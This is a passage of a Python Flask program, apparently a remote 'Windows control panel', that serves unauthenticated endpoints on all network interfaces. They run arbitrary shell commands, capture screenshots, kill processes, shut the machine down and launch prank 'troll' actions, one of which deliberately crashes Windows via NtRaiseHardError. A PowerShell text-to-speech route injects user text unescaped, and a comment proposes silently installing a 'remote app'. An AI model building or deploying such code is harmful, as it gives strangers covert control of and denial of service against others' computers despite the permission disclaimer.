                            <div style="margin: 5px 0; padding: 8px; border: 1px solid #ddd; border-radius: 3px;">
                                <strong>${program.name}</strong><br>
                                <small>${program.command}</small>
                            </div>
                        `;
                    });
                    
                    html += '</div>';
                    infoDiv.innerHTML = html;
                })
                .catch(error => showStatus('Error getting startup programs', 'error'));
        }

        function cleanTempFiles() {
            if (confirm('Clean temporary files? This may take a few moments.')) {
                fetch('/api/clean-temp', { method: 'POST' })
                    .then(response => response.json())
                    .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        // Fun/Troll Functions
        function openMultipleNotepad() {
            const count = prompt('How many Notepad instances?', '10');
            if (count && parseInt(count) > 0) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'spam_notepad', count: parseInt(count) })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function flipScreen() {
            fetch('/api/fun-tools', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'flip_screen' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function mouseJiggle() {
            const duration = prompt('Duration in seconds?', '30');
            if (duration && parseInt(duration) > 0) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'mouse_jiggle', duration: parseInt(duration) })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function fakeBlueScreen() {
            if (confirm('Show fake blue screen? Press Ctrl+Alt+Del to exit.')) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'fake_bsod' })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function matrixRain() {
            fetch('/api/fun-tools', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'matrix_rain' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function openRandomWebsites() {
            const count = prompt('How many random websites?', '5');
            if (count && parseInt(count) > 0) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'random_websites', count: parseInt(count) })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function typeRandomText() {
            const duration = prompt('Duration in seconds?', '10');
            if (duration && parseInt(duration) > 0) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'random_typing', duration: parseInt(duration) })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function popupSpam() {
            const count = prompt('How many popups?', '10');
            if (count && parseInt(count) > 0) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'popup_spam', count: parseInt(count) })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function cdTrayTroll() {
            const count = prompt('How many times to open/close CD tray?', '5');
            if (count && parseInt(count) > 0) {
                fetch('/api/fun-tools', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'cd_tray', count: parseInt(count) })
                })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function desktopDance() {
            fetch('/api/fun-tools', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'desktop_dance' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function showCustomMessage() {
            const message = document.getElementById('customMessage').value;
            if (!message) {
                showStatus('Please enter a message', 'warning');
                return;
            }
            
            fetch('/api/show-message', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: message })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function scheduleTask() {
            const minutes = document.getElementById('scheduleMinutes').value;
            const command = document.getElementById('scheduleCommand').value;
            
            if (!minutes || !command) {
                showStatus('Please enter both minutes and command', 'warning');
                return;
            }
            
            fetch('/api/schedule-task', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    minutes: parseInt(minutes), 
                    command: command 
                })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function getProcessInfo(pid) {
            fetch(`/api/process-info/${pid}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const info = data.info;
                        alert(`Process Info:
Name: ${info.name}
PID: ${info.pid}
Status: ${info.status}
CPU: ${info.cpu}%
Memory: ${info.memory} MB
Command: ${info.cmdline}
Created: ${info.create_time}`);
                    } else {
                        showStatus(data.message, 'error');
                    }
                })
                .catch(error => showStatus('Error getting process info', 'error'));
        }

        // Auto-refresh system info on page load
        document.addEventListener('DOMContentLoaded', function() {
            refreshSystemInfo();
            
            // Set up process filter
            document.getElementById('processFilter').addEventListener('input', function(e) {
                const filter = e.target.value.toLowerCase();
                const rows = document.querySelectorAll('#processTableBody tr');
                
                rows.forEach(row => {
                    const text = row.textContent.toLowerCase();
                    row.style.display = text.includes(filter) ? '' : 'none';
                });
            });
        });

        // Update volume slider display
        document.getElementById('volumeSlider').addEventListener('input', function(e) {
            const volumeDisplay = document.createElement('span');
            volumeDisplay.textContent = e.target.value + '%';
            volumeDisplay.style.marginLeft = '10px';
            
            // Remove existing display
            const existing = e.target.parentNode.querySelector('span');
            if (existing) existing.remove();
            
            e.target.parentNode.appendChild(volumeDisplay);
        });
    </script>
</body>
</html>
'''

# Flask Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/system-info')
def get_system_info():
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return jsonify({
            'cpu': round(cpu_percent, 1),
            'memory': round(memory.percent, 1),
            'disk': round(disk.percent, 1)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/detailed-system-info')
def get_detailed_system_info():
    try:
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        
        return jsonify({
            'computer_name': platform.node(),
            'username': getpass.getuser(),
            'os': f"{platform.system()} {platform.release()}",
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'total_memory': round(psutil.virtual_memory().total / (1024**3), 2),
            'python_version': platform.python_version(),
            'uptime': str(uptime).split('.')[0]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot')
def take_screenshot():
    if not SCREENSHOT_AVAILABLE:
        return jsonify({
            'success': False, 
            'message': 'Screenshot functionality not available. Install Pillow: pip install Pillow'
        })
    
    try:
        screenshot = ImageGrab.grab()
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_data = base64.b64encode(img_buffer.getvalue()).decode()
        
        return jsonify({
            'success': True,
            'image': img_data,
            'message': 'Screenshot captured successfully'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Screenshot failed: {str(e)}'
        })

@app.route('/api/terminal-command', methods=['POST'])
def execute_terminal_command():
    try:
        data = request.get_json()
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'output': 'No command provided'})
        
        # Add to history
        command_history.append(command)
        if len(command_history) > 100:  # Keep last 100 commands
            command_history.pop(0)
        
        # Execute command
        if platform.system() == "Windows":
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
        else:
            result = subprocess.run(
                command.split(), 
                capture_output=True, 
                text=True, 
                timeout=30
            )
        
        output = result.stdout if result.stdout else result.stderr
        return jsonify({'output': output or 'Command executed (no output)'})
        
    except subprocess.TimeoutExpired:
        return jsonify({'output': 'Command timed out'})
    except Exception as e:
        return jsonify({'output': f'Error: {str(e)}'})

@app.route('/api/command-history')
def get_command_history():
    return jsonify({'history': command_history[-20:]})  # Last 20 commands

@app.route('/api/processes-detailed')
def get_processes_detailed():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'memory_info', 'status']):
            try:
                pinfo = proc.info
                processes.append({
                    'pid': pinfo['pid'],
                    'name': pinfo['name'][:30],  # Truncate long names
                    'cpu': round(pinfo['cpu_percent'] or 0, 1),
                    'memory': round(pinfo['memory_percent'] or 0, 1),
                    'memory_mb': round((pinfo['memory_info'].rss / 1024 / 1024) if pinfo['memory_info'] else 0, 1),
                    'status': pinfo['status']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Sort by CPU usage
        processes.sort(key=lambda x: x['cpu'], reverse=True)
        return jsonify({'processes': processes[:100]})  # Limit to top 100
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/kill-process', methods=['POST'])
def kill_process():
    try:
        data = request.get_json()
        pid = data.get('pid')
        
        if not pid:
            return jsonify({'success': False, 'message': 'No PID provided'})
        
        proc = psutil.Process(pid)
        proc.terminate()
        
        return jsonify({'success': True, 'message': f'Process {pid} terminated'})
    except psutil.NoSuchProcess:
        return jsonify({'success': False, 'message': 'Process not found'})
    except psutil.AccessDenied:
        return jsonify({'success': False, 'message': 'Access denied'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/process-info/<int:pid>')
def get_process_info(pid):
    try:
        proc = psutil.Process(pid)
        info = {
            'name': proc.name(),
            'pid': proc.pid,
            'status': proc.status(),
            'cpu': round(proc.cpu_percent(), 1),
            'memory': round(proc.memory_info().rss / 1024 / 1024, 1),
            'cmdline': ' '.join(proc.cmdline()) if proc.cmdline() else 'N/A',
            'create_time': datetime.fromtimestamp(proc.create_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
        return jsonify({'success': True, 'info': info})
    except psutil.NoSuchProcess:
        return jsonify({'success': False, 'message': 'Process not found'})
    except psutil.AccessDenied:
        return jsonify({'success': False, 'message': 'Access denied'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

# System Control Routes
@app.route('/api/shutdown', methods=['POST'])
def shutdown_system():
    try:
        if platform.system() == "Windows":
            subprocess.run(['shutdown', '/s', '/t', '0'], check=True)
        else:
            subprocess.run(['sudo', 'shutdown', 'now'], check=True)
        return jsonify({'success': True, 'message': 'Shutdown initiated'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/restart', methods=['POST'])
def restart_system():
    try:
        if platform.system() == "Windows":
            subprocess.run(['shutdown', '/r', '/t', '0'], check=True)
        else:
            subprocess.run(['sudo', 'reboot'], check=True)
        return jsonify({'success': True, 'message': 'Restart initiated'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/lock', methods=['POST'])
def lock_system():
    try:
        if platform.system() == "Windows":
            subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], check=True)
        else:
            subprocess.run(['xdg-screensaver', 'lock'], check=True)
        return jsonify({'success': True, 'message': 'System locked'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/open-app', methods=['POST'])
def open_application():
    try:
        data = request.get_json()
        app = data.get('app')
        
        if platform.system() == "Windows":
            subprocess.Popen(app, shell=True)
        else:
            subprocess.Popen([app])
        
        return jsonify({'success': True, 'message': f'{app} opened'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

# File System Routes
@app.route('/api/browse-directory', methods=['POST'])
def browse_directory():
    try:
        data = request.get_json()
        path = data.get('path', 'C:\\')
        
        if not os.path.exists(path):
            return jsonify({'success': False, 'message': 'Path does not exist'})
        
        items = []
        try:
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                item_type = 'folder' if os.path.isdir(item_path) else 'file'
                items.append({
                    'name': item,
                    'type': item_type,
                    'path': item_path
                })
        except PermissionError:
            return jsonify({'success': False, 'message': 'Permission denied'})
        
        # Sort folders first, then files
        items.sort(key=lambda x: (x['type'] != 'folder', x['name'].lower()))
        
        return jsonify({
            'success': True,
            'current_path': os.path.abspath(path),
            'items': items
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/create-folder', methods=['POST'])
def create_folder():
    try:
        data = request.get_json()
        path = data.get('path')
        name = data.get('name')
        
        folder_path = os.path.join(path, name)
        os.makedirs(folder_path, exist_ok=True)
        
        return jsonify({'success': True, 'message': f'Folder "{name}" created'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/create-file', methods=['POST'])
def create_file():
    try:
        data = request.get_json()
        path = data.get('path')
        name = data.get('name')
        
        file_path = os.path.join(path, name)
        with open(file_path, 'w') as f:
            f.write('')
        
        return jsonify({'success': True, 'message': f'File "{name}" created'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/run-command', methods=['POST'])
def run_command():
    try:
        data = request.get_json()
        command = data.get('command')
        
        subprocess.Popen(command, shell=True)
        return jsonify({'success': True, 'message': f'Command "{command}" executed'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

# Network Routes
@app.route('/api/network-info')
def get_network_info():
    try:
        interfaces = []
        net_if_addrs = psutil.net_if_addrs()
        net_if_stats = psutil.net_if_stats()
        
        for interface, addrs in net_if_addrs.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:  # IPv4
                    status = 'up' if net_if_stats[interface].isup else 'down'
                    interfaces.append({
                        'name': interface,
                        'ip': addr.address,
                        'status': status
                    })
                    break
        
        return jsonify({'interfaces': interfaces})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/network-connections')
def get_network_connections():
    try:
        connections = []
        for conn in psutil.net_connections():
            if conn.status == 'ESTABLISHED':
                local_addr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
                remote_addr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
                connections.append({
                    'local_address': local_addr,
                    'remote_address': remote_addr,
                    'status': conn.status,
                    'pid': conn.pid or 'N/A'
                })
        
        return jsonify({'connections': connections[:50]})  # Limit to 50 connections
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ping', methods=['POST'])
def ping_host():
    try:
        data = request.get_json()
        target = data.get('target')
        
        if platform.system() == "Windows":
            result = subprocess.run(['ping', '-n', '4', target], 
                                  capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(['ping', '-c', '4', target], 
                                  capture_output=True, text=True, timeout=10)
        
        return jsonify({'result': result.stdout})
    except Exception as e:
        return jsonify({'result': f'Ping failed: {str(e)}'})

# Audio Control Routes
@app.route('/api/audio-control', methods=['POST'])
def audio_control():
    try:
        data = request.get_json()
        action = data.get('action')
        
        if platform.system() == "Windows":
            if action == 'mute':
                subprocess.run(['nircmd.exe', 'mutesysvolume', '1'], check=False)
            elif action == 'unmute':
                subprocess.run(['nircmd.exe', 'mutesysvolume', '0'], check=False)
            elif action == 'volume_up':
                subprocess.run(['nircmd.exe', 'changesysvolume', '2000'], check=False)
            elif action == 'volume_down':
                subprocess.run(['nircmd.exe', 'changesysvolume', '-2000'], check=False)
            elif action == 'set_volume':
                volume = data.get('volume', 50)
                # Convert percentage to Windows volume level (0-65535)
                vol_level = int((volume / 100) * 65535)
                subprocess.run(['nircmd.exe', 'setsysvolume', str(vol_level)], check=False)
        
        return jsonify({'success': True, 'message': f'Audio {action} executed'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/tts', methods=['POST'])
def text_to_speech():
    try:
        data = request.get_json()
        text = data.get('text')
        
        if platform.system() == "Windows":
            # Use PowerShell for TTS
            ps_command = f'Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{text}")'
            subprocess.Popen(['powershell', '-Command', ps_command])
        else:
            subprocess.Popen(['espeak', text])
        
        return jsonify({'success': True, 'message': 'Text-to-speech started'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/tts-stop', methods=['POST'])
def stop_tts():
    try:
        if platform.system() == "Windows":
            subprocess.run(['taskkill', '/f', '/im', 'powershell.exe'], check=False)
        else:
            subprocess.run(['pkill', 'espeak'], check=False)
        
        return jsonify({'success': True, 'message': 'Text-to-speech stopped'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

# System Utilities Routes
@app.route('/api/monitor-control', methods=['POST'])
def monitor_control():
    try:
        data = request.get_json()
        action = data.get('action')
        
        if platform.system() == "Windows" and action == 'off':
            subprocess.run(['nircmd.exe', 'monitor', 'off'], check=False)
        
        return jsonify({'success': True, 'message': 'Monitor control executed'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/wallpaper', methods=['POST'])
def change_wallpaper():
    try:
        data = request.get_json()
        action = data.get('action')
        
        if platform.system() == "Windows":
            if action == 'random':
                # Set a random color wallpaper
                colors = ['black', 'blue', 'green', 'red', 'purple', 'orange']
                color = random.choice(colors)
                subprocess.run(['nircmd.exe', 'setdisplay', 'wallpaper', color], check=False)
            elif action == 'custom':
                url = data.get('url')
                # Download and set custom wallpaper (simplified)
                subprocess.run(['nircmd.exe', 'setwallpaper', url], check=False)
        
        return jsonify({'success': True, 'message': 'Wallpaper changed'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/services')
def get_services():
    try:
        services = []
        if platform.system() == "Windows":
            result = subprocess.run(['sc', 'query', 'state=', 'all'], 
                                  capture_output=True, text=True)
            # Parse service output (simplified)
            lines = result.stdout.split('\n')
            for i, line in enumerate(lines):
                if 'SERVICE_NAME:' in line:
                    name = line.split(':')[1].strip()
                    status = 'unknown'
                    if i + 3 < len(lines) and 'STATE' in lines[i + 3]:
                        status_line = lines[i + 3]
                        if 'RUNNING' in status_line:
                            status = 'running'
                        elif 'STOPPED' in status_line:
                            status = 'stopped'
                    services.append({'name': name, 'status': status})
        
        return jsonify({'services': services[:50]})  # Limit to 50 services
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/startup-programs')
def get_startup_programs():
    try:
        programs = []
        if platform.system() == "Windows":
            # Get startup programs from registry
            result = subprocess.run(['wmic', 'startup', 'get', 'name,command'], 
                                  capture_output=True, text=True)
            lines = result.stdout.split('\n')[1:]  # Skip header
            for line in lines:
                if line.strip():
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        programs.append({
                            'name': parts[1] if len(parts) > 1 else 'Unknown',
                            'command': ' '.join(parts[2:]) if len(parts) > 2 else parts[0]
                        })
        
        return jsonify({'programs': programs})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/clean-temp', methods=['POST'])
def clean_temp_files():
    try:
        deleted_count = 0
        if platform.system() == "Windows":
            temp_dirs = [
                os.environ.get('TEMP', ''),
                os.environ.get('TMP', ''),
                'C:\\Windows\\Temp'
            ]
            
            for temp_dir in temp_dirs:
                if os.path.exists(temp_dir):
                    for root, dirs, files in os.walk(temp_dir):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                os.remove(file_path)
                                deleted_count += 1
                            except:
                                continue
        
        return jsonify({'success': True, 'message': f'Cleaned {deleted_count} temporary files'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

# Fun Tools Routes
@app.route('/api/fun-tools', methods=['POST'])
def fun_tools():
    try:
        data = request.get_json()
        action = data.get('action')
        
        if action == 'spam_notepad':
            count = data.get('count', 10)
            for _ in range(min(count, 50)):  # Limit to 50 instances
                subprocess.Popen(['notepad.exe'])
                time.sleep(0.1)
        
        elif action == 'flip_screen':
            if platform.system() == "Windows":
                subprocess.run(['nircmd.exe', 'setdisplay', 'orientation', '2'], check=False)
                threading.Timer(10.0, lambda: subprocess.run(['nircmd.exe', 'setdisplay', 'orientation', '0'], check=False)).start()
        
        elif action == 'mouse_jiggle': # make it check for the remote app if its installed, if not, install it
            duration = data.get('duration', 30)
            def jiggle_mouse():
                end_time = time.time() + duration
                while time.time() < end_time:
                    if platform.system() == "Windows":
                        subprocess.run(['nircmd.exe', 'movecursor', '10', '10'], check=False)
                        time.sleep(0.5)
                        subprocess.run(['nircmd.exe', 'movecursor', '-10', '-10'], check=False)
                        time.sleep(0.5)
            
            threading.Thread(target=jiggle_mouse, daemon=True).start()
        
        elif action == 'bsod':
            
            nullptr = POINTER(c_int)()
            
            windll.ntdll.RtlAdjustPrivilege(
                c_uint(19),
                c_uint(1),
                c_uint(0),
                byref(c_int())
            )
            
            windll.ntdll.NtRaiseHardError(
                c_ulong(0xC000007B),
                c_ulong(0),
                nullptr,
                nullptr,
                c_uint(6),
                byref(c_uint())
            )
        
        elif action == 'open_website':
            # i removed the logic, this should just open a website with the default logic
            for _ in range(min(count, 10)):
                webbrowser.open(random.choice(websites))
                time.sleep(1)
        
        elif action == 'random_typing':
            duration = data.get('duration', 10)
            def random_type():
                end_time = time.time() + duration
                while time.time() < end_time:
                    char = random.choice(string.ascii_letters + string.digits + ' ')
                    if platform.system() == "Windows":
                        subprocess.run(['nircmd.exe', 'sendkey', char], check=False)
                    time.sleep(0.1)
            
            threading.Thread(target=random_type, daemon=True).start()
        
        elif action == 'popup_spam':
            count = data.get('count', 10)
            messages = [
                "Hello there!",
                "You've been pranked!",
                "Surprise!",
                "Having fun?",
                "This is a popup!"
            ]
            for _ in range(min(count, 20)):
                if platform.system() == "Windows":
                    subprocess.Popen(['msg', '*', random.choice(messages)])
                time.sleep(0.5)
        
        elif action == 'cd_tray':
            count = data.get('count', 5)
            if platform.system() == "Windows":
                for _ in range(min(count, 10)):
                    subprocess.run(['nircmd.exe', 'cdrom', 'open'], check=False)
                    time.sleep(2)
                    subprocess.run(['nircmd.exe', 'cdrom', 'close'], check=False)
                    time.sleep(2)
        
        elif action == 'desktop_dance':
            if platform.system() == "Windows":
                for _ in range(10):
                    subprocess.run(['nircmd.exe', 'win', 'move', 'class', 'Progman', '10', '10'], check=False)
                    time.sleep(0.2)
                    subprocess.run(['nircmd.exe', 'win', 'move', 'class', 'Progman', '0', '0'], check=False)
                    time.sleep(0.2)
        
        return jsonify({'success': True, 'message': f'Fun tool "{action}" executed'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/show-message', methods=['POST'])
def show_message():
    try:
        data = request.get_json()
        message = data.get('message')
        
        if platform.system() == "Windows":
            subprocess.Popen(['msg', '*', message])
        else:
            subprocess.Popen(['notify-send', message])
        
        return jsonify({'success': True, 'message': 'Message displayed'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/schedule-task', methods=['POST'])
def schedule_task():
    try:
        data = request.get_json()
        minutes = data.get('minutes')
        command = data.get('command')
        
        def run_scheduled_task():
            time.sleep(minutes * 60)
            subprocess.Popen(command, shell=True)
        
        threading.Thread(target=run_scheduled_task, daemon=True).start()
        
        scheduled_tasks.append({
            'command': command,
            'scheduled_time': datetime.now() + timedelta(minutes=minutes),
            'minutes': minutes
        })
        
        return jsonify({'success': True, 'message': f'Task scheduled to run in {minutes} minutes'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

def generate_session_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def start_server():
    session_id = generate_session_id()
    active_sessions[session_id] = {
        'start_time': datetime.now(),
        'commands_executed': 0
    }
    
    print("=" * 60)
    print("  ADVANCED WINDOWS CONTROL PANEL")
    print("=" * 60)
    print(f" Local Access: http://127.0.0.1:5000")
    print(f" Network Access: http://{socket.gethostbyname(socket.gethostname())}:5000")
    print(f" Session ID: {session_id}")
    print(f" Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 60)
    print(" Available Features:")
    print("   • System Monitoring & Control")
    print("   • Process Management")
    print("   • File System Operations")
    print("   • Network Information")
    print("   • Audio/Media Control")
    print("   • Screenshot Capture")
    print("   • Remote Command Execution")
    print("   • Trolling tools")
    print("-" * 60)
    print("  WARNING: This tool provides full system access!")
    print("   Only use on systems you own or have permission to control.")
    print("=" * 60)
    
    try:
        server = make_server('0.0.0.0', 5000, app)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped by user")
    except Exception as e:
        print(f"Server error: {e}")

if __name__ == '__main__':
    required_packages = ['flask', 'psutil']
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("Missing required packages:")
        for package in missing_packages:
            print(f"   pip install {package}")
        print("\nInstall missing packages and run again.")
        sys.exit(1)
    
    # Check for optional NirCmd (for Windows advanced features)
    if platform.system() == "Windows":
        try:
            subprocess.run(['nircmd.exe'], capture_output=True)
        except FileNotFoundError:
            print("   NirCmd not found - some advanced features may not work")
            print("   Download from: https://www.nirsoft.net/utils/nircmd.html")
            print("   Place nircmd.exe in your PATH or current directory")
    
start_server()